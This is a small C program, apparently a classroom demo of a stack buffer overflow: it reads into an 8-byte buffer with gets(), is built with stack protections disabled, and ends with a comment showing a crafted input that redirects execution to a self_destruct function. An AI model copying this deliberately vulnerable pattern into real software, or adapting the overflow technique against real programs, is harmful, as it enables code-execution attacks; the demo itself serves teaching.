#include <stdio.h>
/*
** Build with no stack protection:
**
** gcc -Os -fno-pie -D_FORTIFY_SOURCE=0 -fno-stack-protector \
**      -o main1 main1.c
*/

int
main(void)
{
    char name[8];
    gets(name);
    printf("Hello, %s.\n", name);
    return 0;
}

void
self_destruct(void)
{
    puts("**** GO BOOM! ****");
}

/*
$ readelf -a demo | grep self_destruct
46: 00000000004005c5  10 FUNC  GLOBAL DEFAULT 13 self_destruct
$ echo -ne 'xxxxxxxxyyyyyyyy\xc5\x05\x40\x00\x00\x00\x00\x00' > boom
$ ./demo < boom

*/
